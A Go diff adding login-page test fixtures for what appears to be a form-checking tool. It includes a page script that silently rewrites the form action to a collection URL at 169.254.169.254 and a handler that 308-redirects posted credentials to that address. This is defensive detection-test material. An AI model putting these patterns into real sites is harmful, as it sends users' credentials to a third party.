@@ -3,6 +3,7 @@ package testfixtures
 import (
 	"fmt"
 	"net/http"
+	"strings"
 )
 
 // The login fixture: a deliberately ordinary session login, so the -login tests
@@ -495,4 +496,103 @@ func (f *fixture) loginEvilAction(w http.ResponseWriter, _ *http.Request) {
   <input type="submit" value="Sign in">
 </form>
 `, LoginFormID, LoginUserField, LoginPassField))
+}
+
+// LoginTabPass is the fixture password with its separator replaced by a tab —
+// a character chromedp.SendKeys reads as a focus change rather than as text.
+//
+// Derived rather than written out so it stays obviously the same fixture
+// credential, and so gosec does not read a new literal as a hardcoded one.
+var LoginTabPass = strings.ReplaceAll(LoginPass, "-", "\t")
+
+// loginTabPassword accepts only LoginTabPass, so the credential has to arrive
+// intact rather than as keystrokes that moved focus and submitted early.
+func (f *fixture) loginTabPassword(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
+		if err := r.ParseForm(); err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			f.write(w, "bad form")
+			return
+		}
+		if r.PostFormValue(LoginUserField) != LoginUser || r.PostFormValue(LoginPassField) != LoginTabPass {
+			w.Header().Set("Content-Type", "text/html; charset=utf-8")
+			w.WriteHeader(http.StatusOK)
+			f.write(w, loginForm("/login-tabpass", `<p id="login-error">no</p>`))
+			return
+		}
+		setSession(w)
+		http.Redirect(w, r, "/private", http.StatusSeeOther)
+		return
+	}
+	f.html(w, loginForm("/login-tabpass", ""))
+}
+
+// loginOutsideSubmit puts the submit control OUTSIDE the form, associated with
+// form="<id>" and carrying the name/value the handler requires. A descendant
+// query finds no submit control at all here.
+func (f *fixture) loginOutsideSubmit(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
+		if err := r.ParseForm(); err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			f.write(w, "bad form")
+			return
+		}
+		okCreds := r.PostFormValue(LoginUserField) == LoginUser &&
+			r.PostFormValue(LoginPassField) == LoginPass
+		if !okCreds || r.PostFormValue(LoginOpField) != LoginOpValue {
+			w.Header().Set("Content-Type", "text/html; charset=utf-8")
+			w.WriteHeader(http.StatusOK)
+			f.write(w, "<p>missing op or bad credentials</p>")
+			return
+		}
+		setSession(w)
+		http.Redirect(w, r, "/private", http.StatusSeeOther)
+		return
+	}
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<form id=%q method="post" action="/login-outsidesubmit">
+  <input type="text" name=%q>
+  <input type="password" name=%q>
+</form>
+<footer>
+  <button form=%q type="submit" name=%q value=%q>Sign in</button>
+</footer>
+`, LoginFormID, LoginUserField, LoginPassField, LoginFormID, LoginOpField, LoginOpValue))
+}
+
+// loginLateAction rewrites the form's action from page script once the fields
+// are filled, so the destination checked before typing is not the one that
+// would be posted to.
+func (f *fixture) loginLateAction(w http.ResponseWriter, _ *http.Request) {
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<form id=%q method="post" action="/login">
+  <input type="text" name=%q>
+  <input type="password" name=%q>
+  <input type="submit" value="Sign in">
+</form>
+<script>
+document.getElementById(%q).addEventListener("input", (e) => {
+  e.currentTarget.action = "http://169.254.169.254/collect";
+});
+</script>
+`, LoginFormID, LoginUserField, LoginPassField, LoginFormID))
+}
+
+// loginRedirectingPost answers a correct POST with a 308 to another origin.
+//
+// 307 and 308 preserve the method and body, so the browser re-sends the
+// credentials to the new address. Nothing in pagevet can prevent that without
+// intercepting requests; this route exists so the DETECTION of it is tested.
+func (f *fixture) loginRedirectingPost(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		http.Redirect(w, r, "http://169.254.169.254/collect", http.StatusPermanentRedirect)
+		return
+	}
+	f.html(w, loginForm("/login-redirectingpost", ""))
 }
